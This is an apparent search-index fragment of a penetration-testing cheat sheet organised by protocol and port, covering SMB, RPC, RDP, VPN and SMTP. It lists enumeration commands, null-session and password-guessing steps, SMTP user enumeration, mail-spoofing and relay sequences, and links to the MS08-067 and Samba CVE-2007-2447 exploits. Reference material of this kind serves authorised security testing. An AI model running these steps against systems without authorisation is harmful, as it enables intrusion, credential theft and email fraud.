Undelete deleted messages. TOP 1 0 Return headers only TOP 1 10 Return headers and first 10 lines of body","title":"Other commands"},{"location":"protocols-and-ports/PPTP-L2TP-VPN-500,1723/","text":"References New References http://0daysecurity.com/penetration-testing/enumeration.html PSK Cracking using IKE Aggressive Mode: http://www.ernw.de/download/pskattack.pdf Penetration Testing IPsec VPNs: https://www.symantec.com/connect/articles/penetration-testing-ipsec-vpns Scanning and probing a VPN (ikescan): https://www.radarhack.com/dir/papers/Scanning_ike_with_ikescan.pdf","title":"PPTP L2TP VPN 500,1723"},{"location":"protocols-and-ports/PPTP-L2TP-VPN-500,1723/#references","text":"","title":"References"},{"location":"protocols-and-ports/PPTP-L2TP-VPN-500,1723/#new-references","text":"http://0daysecurity.com/penetration-testing/enumeration.html PSK Cracking using IKE Aggressive Mode: http://www.ernw.de/download/pskattack.pdf Penetration Testing IPsec VPNs: https://www.symantec.com/connect/articles/penetration-testing-ipsec-vpns Scanning and probing a VPN (ikescan): https://www.radarhack.com/dir/papers/Scanning_ike_with_ikescan.pdf","title":"New References"},{"location":"protocols-and-ports/Portmapper-111/","text":"Part of ONC RPC services Tools rpcdump.py rpcdump.py username:password@IP_Address port/protocol (i.e. 80/HTTP) rpcinfo rpcinfo [options] IP_Address","title":"Portmapper 111"},{"location":"protocols-and-ports/Portmapper-111/#tools","text":"","title":"Tools"},{"location":"protocols-and-ports/Portmapper-111/#rpcdumppy","text":"rpcdump.py username:password@IP_Address port/protocol (i.e. 80/HTTP)","title":"rpcdump.py"},{"location":"protocols-and-ports/Portmapper-111/#rpcinfo","text":"rpcinfo [options] IP_Address","title":"rpcinfo"},{"location":"protocols-and-ports/RDP-3389/","text":"Tools List the RDP Connections History: https://github.com/3gstudent/List-RDP-Connections-History RDP hijacking\u200a\u2014\u200ahow to hijack RDS and RemoteApp sessions transparently to move through an organisation: https://doublepulsar.com/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6","title":"RDP 3389"},{"location":"protocols-and-ports/RDP-3389/#tools","text":"List the RDP Connections History: https://github.com/3gstudent/List-RDP-Connections-History RDP hijacking\u200a\u2014\u200ahow to hijack RDS and RemoteApp sessions transparently to move through an organisation: https://doublepulsar.com/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6","title":"Tools"},{"location":"protocols-and-ports/RPC-445/","text":"Check Portmapper-111.md for port 1111. Tools rpcinfo rpcinfo -p","title":"RPC 445"},{"location":"protocols-and-ports/RPC-445/#tools","text":"","title":"Tools"},{"location":"protocols-and-ports/RPC-445/#rpcinfo","text":"rpcinfo -p","title":"rpcinfo"},{"location":"protocols-and-ports/SIP-5060/","text":"References New References http://0daysecurity.com/penetration-testing/enumeration.html","title":"SIP 5060"},{"location":"protocols-and-ports/SIP-5060/#references","text":"","title":"References"},{"location":"protocols-and-ports/SIP-5060/#new-references","text":"http://0daysecurity.com/penetration-testing/enumeration.html","title":"New References"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/","text":"Server Message Block (SMB) Versions SMB Version Windows version CIFS Microsoft Windows NT 4.0 SMB 1.0 Windows 2000, Windows XP, Windows Server 2003 and Windows Server 2003 R2 SMB 2.0 Windows Vista Windows Server 2008 SMB 2.1 Windows 7 and Windows Server 2008 R2 SMB 3.0 Windows 8 and Windows Server 2012 SMB 3.0.2 Windows 8.1 and Windows Server 2012 R2 SMB 3.1.1 Windows 10 and Windows Server 2016 Ports netbios-ns 137/tcp # (NBT over IP) NETBIOS Name Service netbios-ns 137/udp netbios-dgm 138/tcp # (NBT over IP) NETBIOS Datagram Service netbios-dgm 138/udp netbios-ssn 139/tcp # (NBT over IP) NETBIOS session service netbios-ssn 139/udp microsoft-ds 445/tcp # (SMB over IP) If you are using Active Directory (used when SMB is used directly on TCP stack, without using NetBIOS) NetBIOS suffixes For unique names: 00: Workstation Service (workstation name) 03: Windows Messenger service 06: Remote Access Service 20: File Service (also called Host Record) 21: Remote Access Service client 1B: Domain Master Browser \u2013 Primary Domain Controller for a domain 1D: Master Browser For group names: 00: Workstation Service (workgroup/domain name) 1C: Domain Controllers for a domain 1E: Browser Service Elections Scanning Ref: https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/ nmap nmap --script safe -445 $ip nmap --script smb-protocols -p445 $ip nmap -p 139,446 $ip --open nmap \u2010v \u2010p 139,445 -\u2010script smb\u2010* $ip nmap \u2010v \u2010p 139,445 -\u2010script smb\u2010vuln* $ip nmap \u2010v \u2010p 139,445 -\u2010script smb\u2010security\u2010mode $ip nmap \u2010v \u2010p 139,445 -\u2010script smb\u2010os-discovery $ip nmap \u2010v \u2010p 139,445 -\u2010script smb\u2010check-vulns --script-args=unsafe=1 $ip nmblookup Query NetBIOS names and map them to IP addresses in a network Using NetBIOS over TCP/IP queries nmblookup -A $ip nbtscan Scan NetBIOS name servers open on a local or remote TCP/IP network Works on a whole subnet instead of individual IP Similar to nbtstat (Windows standard tool) nbtscan $ip/24 nbtstat nbtstat $ip nbtscan -\u2010r $ip/24 SMBMap - enumerate samba share drives across an entire domain Allows users to enumerate samba share drives across an entire domain Usage List share drives, drive permissions, share contents Upload/download functionality File name auto-download pattern matching Execute remote commands smbmap -H $ip smbmap -u user -p password -d workgroup -H $ip smbmap -u user -p password -d workgroup -H $ip -L #test command execution smbmap -u user -p password -d workgroup -H $ip -r #read drive Recursively list dirs, and files: smbmap -R $sharename -H $ip Search for Groups.xml in given share: smbmap -R $shareName -H $ip -A Groups.xml -q Downloads a file in quiet mode: smbmap -R $sharename -H $ip -A $fileyouwanttodownload -q smbclient Client that can \"talk\" to an SMB/CIFS server Operations Upload/download functionality Retrieving directory information smbclient -L $ip smbclient -L $ip -U $username -p 445 password: prompt smbclient -L //server/share smbclient -L //server/share password options smb: \\ RECURSE ON smb: \\ PROMPT OFF smb: \\ mget * rpcclient Part of the Samba suite Developed to test MS-RPC functionality in Samba Usable to open an authenticated SMB session to a target machine NULL session: rpcclient -U -N 192.168.1.102 User session: rpcclient -U htb\\\\james mantis.htb.local Querying: rpcclient $ srvinfo rpcclient $ enum tab tab rpcclient $ enumdomusers // Username and RID (suffix of SID) rpcclient $ queryuser 0x3e8 // Info of the user for given RID rpcclient $ enumalsgroups domain // Enum aliases groups rpcclient $ enumalsgroups builtin rpcclient $ lookupnames james Enum4linux Tool for enumerating information from Windows and Samba systems Wrapper for smbclient , rpcclient , net and nmblookup enum4linux -a $ip enum4linux -U $ip - RID cycling (When RestrictAnonymous is set to 1 on Windows 2000) - User listing (When RestrictAnonymous is set to 0 on Windows 2000) - Listing of group membership information - Share enumeration - Detecting if the host is in a workgroup or a domain - Identifying the remote operating system - Password policy retrieval Ref: https://hackercool.com/2016/07/smb-enumeration-with-kali-linux-enum4linuxacccheck-smbmap/ acccheck Password attacks acccheck -v -t $ip -u user -P password_file mblookup NetBIOS over TCP/IP client used to lookup NetBIOS names Mount SMB share sudo apt-get install cifs-utils mkdir /mnt/$shareName mount -t cifs //$ip/$shareName /mnt/$shareName -o username=$username,password=$password,domain=$domain Null Session Enumeration Null Session Enumeration (enabled by default in SMB1) net use \\\\192.168.1.1\\ipc$ /u: net view \\\\ip_address rpcclient -U ip (give empty password) srvinfo enumdomusers getdompwinfo Use UpTime to guess patch level https://github.com/SpiderLabs/Responder/blob/master/tools/FindSMB2UPTime.py python FindSMB2UpTime.py 172.16.80.10 Enable / Disable / Status Detect, enable and disableyeha SMBv1, SMBv2, and SMBv3 in Windows and Windows Server: https://support.microsoft.com/en-gb/help/2696547/how-to-detect-enable-and-disable-smbv1-smbv2-and-smbv3-in-windows-and Windows Server 2012 R2 2016: PowerShell methods SMB v1 Detect: Get-WindowsFeature FS-SMB1 Disable: Disable-WindowsOptionalFeature -Online -FeatureName smb1protocol Enable: Enable-WindowsOptionalFeature -Online -FeatureName smb1protocol SMB v2/v3 Detect: Get-SmbServerConfiguration | Select EnableSMB2Protocol Disable: Set-SmbServerConfiguration -EnableSMB2Protocol $false Enable: Set-SmbServerConfiguration -EnableSMB2Protocol $true Windows 8.1 and Windows 10: PowerShell method SMB v1 Protocol Detect: Get-WindowsOptionalFeature \u2013Online \u2013FeatureName SMB1Protocol Disable: Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol Enable: Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol SMB v2/v3 Protocol Detect: Get-SmbServerConfiguration | Select EnableSMB2Protocol Disable: Set-SmbServerConfiguration \u2013EnableSMB2Protocol $false Enable: Set-SmbServerConfiguration \u2013EnableSMB2Protocol $true Windows 8 and Windows Server 2012 SMB v1 on SMB Server Detect: Get-SmbServerConfiguration | Select EnableSMB1Protocol Disable: Set-SmbServerConfiguration -EnableSMB1Protocol $false Enable: Set-SmbServerConfiguration -EnableSMB1Protocol $true SMB v2/v3 on SMB Server Detect: Get-SmbServerConfiguration | Select EnableSMB2Protocol Disable: Set-SmbServerConfiguration -EnableSMB2Protocol $false Enable: Set-SmbServerConfiguration -EnableSMB2Protocol $true Windows 7, Windows Server 2008 R2, Windows Vista, and Windows Server 2008 SMB v1 on SMB Server Default configuration = Enabled (No registry key is created), so no SMB1 value will be returned Detect: Get-Item HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters | ForEach-Object {Get-ItemProperty $_.pspath} Disable: Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" SMB1 -Type DWORD -Value 0 \u2013Force Enable: Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" SMB1 -Type DWORD -Value 1 \u2013Force SMB v2/v3 on SMB Server Detect: `Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters | ForEach-Object {Get-ItemProperty $_.pspath}`` Disable: Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" SMB2 -Type DWORD -Value 0 \u2013Force Enable: Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" SMB2 -Type DWORD -Value 1 \u2013Force Disable SMB Client SMB v1 on SMB Client Detect: sc.exe qc lanmanworkstation Disable: sc.exe config lanmanworkstation depend= bowser/mrxsmb20/nsi sc.exe config mrxsmb10 start= disabled Enable: sc.exe config lanmanworkstation depend= bowser/mrxsmb10/mrxsmb20/nsi sc.exe config mrxsmb10 start= auto SMB v2/v3 on SMB Client Detect: sc.exe qc lanmanworkstation Disable: sc.exe config lanmanworkstation depend= bowser/mrxsmb10/nsi sc.exe config mrxsmb20 start= disabled Enable: sc.exe config lanmanworkstation depend= bowser/mrxsmb10/mrxsmb20/nsi sc.exe config mrxsmb20 start= auto Samba Configuration Configuration file /etc/samba/smb.conf smb.conf lmhosts Test reload configuration testparm -v service smb restart User creation smbpasswd -a username Samba Enumeration #!/bin/sh # Author: rewardone # Description: # Requires root or enough permissions to use tcpdump # Will listen for the first 7 packets of a null login # and grab the SMB Version # Notes: # Will sometimes not capture or will print multiple # lines. May need to run a second time for success. if [ -z $1 ]; then echo Usage: ./smbver.sh RHOST {RPORT} exit; else rhost=$1; fi if [ ! -z $2 ]; then rport=$2; else rport=139; fi tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2 /dev/null | grep -i samba\\|s.a.m | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\\n' echo -n $rhost: echo exit | smbclient -L $rhost 1 /dev/null 2 /dev/null echo sleep .1 Pending Tools SuperScan Hyena Winfingerprint NetBIOS enumerator References https://www.youtube.com/watch?v=jUc1J31DNdw t=445s Implementing CIFS - The Common Internet Filesystem - http://www.ubiqx.org/cifs/ Using Samba 2nd Edition - http://www.samba.org/samba/docs/using_samba/toc.html Vulnerabilities Linux CVE-2007-2447 - Samba versions 3.0.20 through 3.0.25rc3 When the \"username map script\" smb.conf option is enabled https://github.com/amriunix/cve-2007-2447 exploit/windows/smb/ms08_067_netapi Windows CVE-2008-4250 MS08-067 - Microsoft Server Service Relative Path Stack Corruption Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 Pre-Beta https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py https://vulners.com/exploitdb/EDB-ID:6824 exploit/windows/smb/ms08_067_netapi","title":"SMB Samba NetBIOS 135 139,445"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#server-message-block-smb-versions","text":"SMB Version Windows version CIFS Microsoft Windows NT 4.0 SMB 1.0 Windows 2000, Windows XP, Windows Server 2003 and Windows Server 2003 R2 SMB 2.0 Windows Vista Windows Server 2008 SMB 2.1 Windows 7 and Windows Server 2008 R2 SMB 3.0 Windows 8 and Windows Server 2012 SMB 3.0.2 Windows 8.1 and Windows Server 2012 R2 SMB 3.1.1 Windows 10 and Windows Server 2016","title":"Server Message Block (SMB) Versions"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#ports","text":"netbios-ns 137/tcp # (NBT over IP) NETBIOS Name Service netbios-ns 137/udp netbios-dgm 138/tcp # (NBT over IP) NETBIOS Datagram Service netbios-dgm 138/udp netbios-ssn 139/tcp # (NBT over IP) NETBIOS session service netbios-ssn 139/udp microsoft-ds 445/tcp # (SMB over IP) If you are using Active Directory (used when SMB is used directly on TCP stack, without using NetBIOS)","title":"Ports"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#netbios-suffixes","text":"For unique names: 00: Workstation Service (workstation name) 03: Windows Messenger service 06: Remote Access Service 20: File Service (also called Host Record) 21: Remote Access Service client 1B: Domain Master Browser \u2013 Primary Domain Controller for a domain 1D: Master Browser For group names: 00: Workstation Service (workgroup/domain name) 1C: Domain Controllers for a domain 1E: Browser Service Elections","title":"NetBIOS suffixes"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#scanning","text":"Ref: https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/","title":"Scanning"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#nmap","text":"nmap --script safe -445 $ip nmap --script smb-protocols -p445 $ip nmap -p 139,446 $ip --open nmap \u2010v \u2010p 139,445 -\u2010script smb\u2010* $ip nmap \u2010v \u2010p 139,445 -\u2010script smb\u2010vuln* $ip nmap \u2010v \u2010p 139,445 -\u2010script smb\u2010security\u2010mode $ip nmap \u2010v \u2010p 139,445 -\u2010script smb\u2010os-discovery $ip nmap \u2010v \u2010p 139,445 -\u2010script smb\u2010check-vulns --script-args=unsafe=1 $ip","title":"nmap"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#nmblookup","text":"Query NetBIOS names and map them to IP addresses in a network Using NetBIOS over TCP/IP queries nmblookup -A $ip","title":"nmblookup"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#nbtscan","text":"Scan NetBIOS name servers open on a local or remote TCP/IP network Works on a whole subnet instead of individual IP Similar to nbtstat (Windows standard tool) nbtscan $ip/24","title":"nbtscan"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#nbtstat","text":"nbtstat $ip nbtscan -\u2010r $ip/24","title":"nbtstat"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#smbmap-enumerate-samba-share-drives-across-an-entire-domain","text":"Allows users to enumerate samba share drives across an entire domain Usage List share drives, drive permissions, share contents Upload/download functionality File name auto-download pattern matching Execute remote commands smbmap -H $ip smbmap -u user -p password -d workgroup -H $ip smbmap -u user -p password -d workgroup -H $ip -L #test command execution smbmap -u user -p password -d workgroup -H $ip -r #read drive Recursively list dirs, and files: smbmap -R $sharename -H $ip Search for Groups.xml in given share: smbmap -R $shareName -H $ip -A Groups.xml -q Downloads a file in quiet mode: smbmap -R $sharename -H $ip -A $fileyouwanttodownload -q","title":"SMBMap - enumerate samba share drives across an entire domain"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#smbclient","text":"Client that can \"talk\" to an SMB/CIFS server Operations Upload/download functionality Retrieving directory information smbclient -L $ip smbclient -L $ip -U $username -p 445 password: prompt smbclient -L //server/share smbclient -L //server/share password options smb: \\ RECURSE ON smb: \\ PROMPT OFF smb: \\ mget *","title":"smbclient"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#rpcclient","text":"Part of the Samba suite Developed to test MS-RPC functionality in Samba Usable to open an authenticated SMB session to a target machine NULL session: rpcclient -U -N 192.168.1.102 User session: rpcclient -U htb\\\\james mantis.htb.local Querying: rpcclient $ srvinfo rpcclient $ enum tab tab rpcclient $ enumdomusers // Username and RID (suffix of SID) rpcclient $ queryuser 0x3e8 // Info of the user for given RID rpcclient $ enumalsgroups domain // Enum aliases groups rpcclient $ enumalsgroups builtin rpcclient $ lookupnames james","title":"rpcclient"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#enum4linux","text":"Tool for enumerating information from Windows and Samba systems Wrapper for smbclient , rpcclient , net and nmblookup enum4linux -a $ip enum4linux -U $ip - RID cycling (When RestrictAnonymous is set to 1 on Windows 2000) - User listing (When RestrictAnonymous is set to 0 on Windows 2000) - Listing of group membership information - Share enumeration - Detecting if the host is in a workgroup or a domain - Identifying the remote operating system - Password policy retrieval Ref: https://hackercool.com/2016/07/smb-enumeration-with-kali-linux-enum4linuxacccheck-smbmap/","title":"Enum4linux"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#acccheck","text":"Password attacks acccheck -v -t $ip -u user -P password_file","title":"acccheck"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#mblookup","text":"NetBIOS over TCP/IP client used to lookup NetBIOS names","title":"mblookup"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#mount-smb-share","text":"sudo apt-get install cifs-utils mkdir /mnt/$shareName mount -t cifs //$ip/$shareName /mnt/$shareName -o username=$username,password=$password,domain=$domain","title":"Mount SMB share"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#null-session-enumeration","text":"Null Session Enumeration (enabled by default in SMB1) net use \\\\192.168.1.1\\ipc$ /u: net view \\\\ip_address rpcclient -U ip (give empty password) srvinfo enumdomusers getdompwinfo","title":"Null Session Enumeration"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#use-uptime-to-guess-patch-level","text":"https://github.com/SpiderLabs/Responder/blob/master/tools/FindSMB2UPTime.py python FindSMB2UpTime.py 172.16.80.10","title":"Use UpTime to guess patch level"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#enable-disable-status","text":"Detect, enable and disableyeha SMBv1, SMBv2, and SMBv3 in Windows and Windows Server: https://support.microsoft.com/en-gb/help/2696547/how-to-detect-enable-and-disable-smbv1-smbv2-and-smbv3-in-windows-and","title":"Enable / Disable / Status"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#windows-server-2012-r2-2016-powershell-methods","text":"","title":"Windows Server 2012 R2 &amp; 2016: PowerShell methods"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#smb-v1","text":"Detect: Get-WindowsFeature FS-SMB1 Disable: Disable-WindowsOptionalFeature -Online -FeatureName smb1protocol Enable: Enable-WindowsOptionalFeature -Online -FeatureName smb1protocol","title":"SMB v1"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#smb-v2v3","text":"Detect: Get-SmbServerConfiguration | Select EnableSMB2Protocol Disable: Set-SmbServerConfiguration -EnableSMB2Protocol $false Enable: Set-SmbServerConfiguration -EnableSMB2Protocol $true","title":"SMB v2/v3"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#windows-81-and-windows-10-powershell-method","text":"","title":"Windows 8.1 and Windows 10: PowerShell method"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#smb-v1-protocol","text":"Detect: Get-WindowsOptionalFeature \u2013Online \u2013FeatureName SMB1Protocol Disable: Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol Enable: Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol","title":"SMB v1 Protocol"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#smb-v2v3-protocol","text":"Detect: Get-SmbServerConfiguration | Select EnableSMB2Protocol Disable: Set-SmbServerConfiguration \u2013EnableSMB2Protocol $false Enable: Set-SmbServerConfiguration \u2013EnableSMB2Protocol $true","title":"SMB v2/v3 Protocol"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#windows-8-and-windows-server-2012","text":"","title":"Windows 8 and Windows Server 2012"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#smb-v1-on-smb-server","text":"Detect: Get-SmbServerConfiguration | Select EnableSMB1Protocol Disable: Set-SmbServerConfiguration -EnableSMB1Protocol $false Enable: Set-SmbServerConfiguration -EnableSMB1Protocol $true","title":"SMB v1 on SMB Server"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#smb-v2v3-on-smb-server","text":"Detect: Get-SmbServerConfiguration | Select EnableSMB2Protocol Disable: Set-SmbServerConfiguration -EnableSMB2Protocol $false Enable: Set-SmbServerConfiguration -EnableSMB2Protocol $true","title":"SMB v2/v3 on SMB Server"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#windows-7-windows-server-2008-r2-windows-vista-and-windows-server-2008","text":"","title":"Windows 7, Windows Server 2008 R2, Windows Vista, and Windows Server 2008"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#smb-v1-on-smb-server_1","text":"Default configuration = Enabled (No registry key is created), so no SMB1 value will be returned Detect: Get-Item HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters | ForEach-Object {Get-ItemProperty $_.pspath} Disable: Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" SMB1 -Type DWORD -Value 0 \u2013Force Enable: Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" SMB1 -Type DWORD -Value 1 \u2013Force","title":"SMB v1 on SMB Server"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#smb-v2v3-on-smb-server_1","text":"Detect: `Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters | ForEach-Object {Get-ItemProperty $_.pspath}`` Disable: Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" SMB2 -Type DWORD -Value 0 \u2013Force Enable: Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" SMB2 -Type DWORD -Value 1 \u2013Force","title":"SMB v2/v3 on SMB Server"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#disable-smb-client","text":"","title":"Disable SMB Client"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#smb-v1-on-smb-client","text":"Detect: sc.exe qc lanmanworkstation Disable: sc.exe config lanmanworkstation depend= bowser/mrxsmb20/nsi sc.exe config mrxsmb10 start= disabled Enable: sc.exe config lanmanworkstation depend= bowser/mrxsmb10/mrxsmb20/nsi sc.exe config mrxsmb10 start= auto","title":"SMB v1 on SMB Client"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#smb-v2v3-on-smb-client","text":"Detect: sc.exe qc lanmanworkstation Disable: sc.exe config lanmanworkstation depend= bowser/mrxsmb10/nsi sc.exe config mrxsmb20 start= disabled Enable: sc.exe config lanmanworkstation depend= bowser/mrxsmb10/mrxsmb20/nsi sc.exe config mrxsmb20 start= auto","title":"SMB v2/v3 on SMB Client"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#samba-configuration","text":"Configuration file /etc/samba/smb.conf smb.conf lmhosts Test reload configuration testparm -v service smb restart User creation smbpasswd -a username","title":"Samba Configuration"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#samba-enumeration","text":"#!/bin/sh # Author: rewardone # Description: # Requires root or enough permissions to use tcpdump # Will listen for the first 7 packets of a null login # and grab the SMB Version # Notes: # Will sometimes not capture or will print multiple # lines. May need to run a second time for success. if [ -z $1 ]; then echo Usage: ./smbver.sh RHOST {RPORT} exit; else rhost=$1; fi if [ ! -z $2 ]; then rport=$2; else rport=139; fi tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2 /dev/null | grep -i samba\\|s.a.m | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\\n' echo -n $rhost: echo exit | smbclient -L $rhost 1 /dev/null 2 /dev/null echo sleep .1","title":"Samba Enumeration"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#pending-tools","text":"SuperScan Hyena Winfingerprint NetBIOS enumerator","title":"Pending Tools"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#references","text":"https://www.youtube.com/watch?v=jUc1J31DNdw t=445s Implementing CIFS - The Common Internet Filesystem - http://www.ubiqx.org/cifs/ Using Samba 2nd Edition - http://www.samba.org/samba/docs/using_samba/toc.html","title":"References"},{"location":"protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/#vulnerabilities","text":"Linux CVE-2007-2447 - Samba versions 3.0.20 through 3.0.25rc3 When the \"username map script\" smb.conf option is enabled https://github.com/amriunix/cve-2007-2447 exploit/windows/smb/ms08_067_netapi Windows CVE-2008-4250 MS08-067 - Microsoft Server Service Relative Path Stack Corruption Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 Pre-Beta https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py https://vulners.com/exploitdb/EDB-ID:6824 exploit/windows/smb/ms08_067_netapi","title":"Vulnerabilities"},{"location":"protocols-and-ports/SMTP-25/","text":"Configuration files sendmail.cf submit.cf General nc -\u2010nv 192.168.11.215 25 \"HELP\" Command User enumeration with: \"VRFY\", \"EXPN\" \"RCPT\" commands: VRFY username (verifies if username exists - enumeration of accounts) EXPN username (verifies if username is valid - enumeration of accounts) VRFY existing_user Results in: 250 VRFY nonexisting_user Results in: 550 for user in $(cat users.txt); do echo VRFY $user | nc -nv -w ip 25 2 /dev/null | grep ^ 250 ; done Mail Spoofing HELO anything MAIL FROM: spoofed_address RCPT TO:valid_mail_account DATA . QUIT http://0daysecurity.com/penetration-testing/enumeration.html Mail Relay HELO anything Identical to/from - mail from: nobody@domain rcpt to: nobody@domain Unknown domain - mail from: user@unknown_domain Domain not present - mail from: user@localhost Domain not supplied - mail from: user Source address omission - mail from: rcpt to: nobody@recipient_domain Use IP address of target server - mail from: user@IP_Address rcpt to: nobody@recipient_domain Use double quotes - mail from: user@domain rcpt to: user@recipent-domain User IP address of the target server - mail from: user@domain rcpt to: nobody@recipient_domain@[IP Address] Disparate formatting - mail from: user@[IP Address] rcpt to: @domain:nobody@recipient-domain Disparate formatting2 - mail from: user@[IP Address] rcpt to: recipient_domain!nobody@[IP Address] http://0daysecurity.com/penetration-testing/enumeration.html Sending a mail HELO my.server.com MAIL FROM: RCPT TO: DATA From: Danny Dolittle To: Sarah Smith Subject: Email sample Mime-Version: 1.0 Content-Type: text/plain; charset=us-ascii This is a test email for you to read. . QUIT Tools smtp_enum auxiliary/scanner/smtp/smtp_enum smtp-enum-users.nse nmap \u2013script smtp-enum-users.nse 172.16.212.133 Other commands Command Comment ATRN Authenticated TURN AUTH Authentication BDAT Binary data BURL Remote content DATA The actual email message to be sent. This command is terminated with a line that contains only a EHLO Extended HELO ETRN Extended turn EXPN Expand HELO Identify yourself to the SMTP server. HELP Show available commands MAIL Send mail from email account, MAIL FROM: me@mydomain.com NOOP No-op. Keeps you connection open. ONEX One message transaction only QUIT End session RCPT Send email to recipient, RCPT TO: you@yourdomain.com RSET Reset SAML Send and mail SEND Send SOML Send or mail STARTTLS SUBMITTER SMTP responsible submitter TURN Turn VERB Verbose VRFY Verify","title":"SMTP 25"},{"location":"protocols-and-ports/SMTP-25/#configuration-files","text":"sendmail.cf submit.cf","title":"Configuration files"},{"location":"protocols-and-ports/SMTP-25/#general","text":"nc -\u2010nv 192.168.11.215 25","title":"General"},{"location":"protocols-and-ports/SMTP-25/#help-command","text":"","title":"\"HELP\" Command"},{"location":"protocols-and-ports/SMTP-25/#user-enumeration-with-vrfy-expn-rcpt-commands","text":"VRFY username (verifies if username exists - enumeration of accounts) EXPN username (verifies if username is valid - enumeration of accounts) VRFY existing_user Results in: 250 VRFY nonexisting_user Results in: 550 for user in $(cat users.txt); do echo VRFY $user | nc -nv -w ip 25 2 /dev/null | grep ^ 250 ; done","title":"User enumeration with: \"VRFY\", \"EXPN\" &amp; \"RCPT\" commands:"},{"location":"protocols-and-ports/SMTP-25/#mail-spoofing","text":"HELO anything MAIL FROM: spoofed_address RCPT TO:valid_mail_account DATA . QUIT http://0daysecurity.com/penetration-testing/enumeration.html","title":"Mail Spoofing"},{"location":"protocols-and-ports/SMTP-25/#mail-relay","text":"HELO anything Identical to/from - mail from: nobody@domain rcpt to: nobody@domain Unknown domain - mail from: user@unknown_domain Domain not present - mail from: user@localhost Domain not supplied - mail from: user Source address omission - mail from: rcpt to: nobody@recipient_domain Use IP address of target server - mail from: user@IP_Address rcpt to: nobody@recipient_domain Use double quotes - mail from: user@domain rcpt to: user@recipent-domain User IP address of the target server - mail from: user@domain rcpt to: nobody@recipient_domain@[IP Address] Disparate formatting 